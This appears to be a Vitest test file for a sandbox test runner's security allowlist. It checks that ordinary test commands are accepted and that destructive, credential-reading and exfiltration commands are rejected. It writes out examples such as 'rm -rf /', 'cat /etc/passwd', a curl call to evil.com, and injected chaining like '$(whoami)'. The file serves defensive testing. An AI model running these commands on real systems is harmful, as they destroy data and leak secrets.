import { describe, it, expect } from "vitest";
import { validateTestCommand, parseNodeTestOutput, executeTestCommand } from "@/lib/sandbox/test-runner";
import path from "node:path";

describe("Test Runner & Execution Security Allowlist", () => {
  it("allows approved test commands", () => {
    expect(validateTestCommand("node --test test/calculator.test.js").isAllowed).toBe(true);
    expect(validateTestCommand("node --test").isAllowed).toBe(true);
    expect(validateTestCommand("npm test").isAllowed).toBe(true);
    expect(validateTestCommand("npx vitest run").isAllowed).toBe(true);
  });

  it("rejects unauthorized commands", () => {
    expect(validateTestCommand("rm -rf /").isAllowed).toBe(false);
    expect(validateTestCommand("cat /etc/passwd").isAllowed).toBe(false);
    expect(validateTestCommand("curl https://evil.com/leak").isAllowed).toBe(false);
    expect(validateTestCommand("python evil.py").isAllowed).toBe(false);
  });

  it("rejects dangerous shell chaining metacharacters", () => {
    expect(validateTestCommand("npm test; rm -rf .").isAllowed).toBe(false);
    expect(validateTestCommand("npm test && whoami").isAllowed).toBe(false);
    expect(validateTestCommand("node --test | grep pass").isAllowed).toBe(false);
    expect(validateTestCommand("node --test `evil`").isAllowed).toBe(false);
    expect(validateTestCommand("node --test $(whoami)").isAllowed).toBe(false);
    expect(validateTestCommand("node --test > leak.txt").isAllowed).toBe(false);
  });

  it("parses Node test stdout and assertions correctly", () => {
    const sampleOutput = `
✔ CalcVault - safeDivide with normal inputs (1.23ms)
✖ CalcVault - safeDivide throws DivisionByZeroError (2.45ms)
  AssertionError [ERR_ASSERTION]: Expected values to be strictly equal
ℹ pass 1
ℹ fail 1
`;
    const parsed = parseNodeTestOutput(sampleOutput, "");
    expect(parsed.total).toBe(2);
    expect(parsed.passed).toBe(1);
    expect(parsed.failed).toBe(1);
    expect(parsed.assertions.length).toBe(2);
    expect(parsed.assertions[0].passed).toBe(true);
    expect(parsed.assertions[1].passed).toBe(false);
    expect(parsed.assertions[1].error).toContain("AssertionError");
  });

  it("rejects execution when command fails allowlist check", async () => {
    const res = await executeTestCommand({
      workspaceRoot: process.cwd(),
      command: "bash -c 'malicious'"
    });

    expect(res.passed).toBe(false);
    expect(res.exitCode).toBe(1);
    expect(res.stderr).toContain("Security Policy Rejection");
  });
});
